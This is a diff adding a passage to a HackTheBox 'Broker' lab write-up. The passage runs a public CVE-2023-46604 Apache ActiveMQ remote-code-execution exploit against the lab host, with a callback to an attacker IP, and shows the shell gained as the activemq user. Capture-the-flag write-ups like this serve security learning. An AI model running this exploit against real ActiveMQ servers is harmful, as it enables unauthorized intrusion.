@@ -140,7 +140,27 @@ Logging in shows we have access to Apache ActiveMQ:
 
 ![Apache ActiveMQ](https://github.com/timmccann222/Public-Writeups-Library/blob/main/HackTheBox/Linux%20Machines/Broker/Images/Apache%20ActiveMQ.png)
 
+A search online returns [CVE-2023-46604 RCE Pseudoshell](https://github.com/duck-sec/CVE-2023-46604-ActiveMQ-RCE-pseudoshell), which can be exploited using the exploit script on the github link as seen below:
 
+```bash
+sudo python3 exploit.py -i 10.10.11.243 -si <attacker_ip>
+
+[Target not responding!]$ whoami
+activemq
+
+Apache ActiveMQ$ ls -lab
+total 164
+drwxr-xr-x  5 activemq activemq  4096 Nov  7  2023 .
+drwxr-xr-x 11 activemq activemq  4096 Nov  6  2023 ..
+-rwxr-xr-x  1 activemq activemq 21404 Apr 20  2021 activemq
+-rwxr-xr-x  1 activemq activemq  6189 Apr 20  2021 activemq-diag
+-rw-r--r--  1 activemq activemq 16389 Apr 20  2021 activemq.jar
+-rw-r--r--  1 activemq activemq  5597 Apr 20  2021 env
+drwxr-xr-x  2 activemq activemq  4096 Nov  5  2023 linux-x86-32
+drwxr-xr-x  2 activemq activemq  4096 Nov  5  2023 linux-x86-64
+drwxr-xr-x  2 activemq activemq  4096 Nov  5  2023 macosx
+-rw-r--r--  1 activemq activemq 83820 Apr 20  2021 wrapper.jar
+```
 
 
 
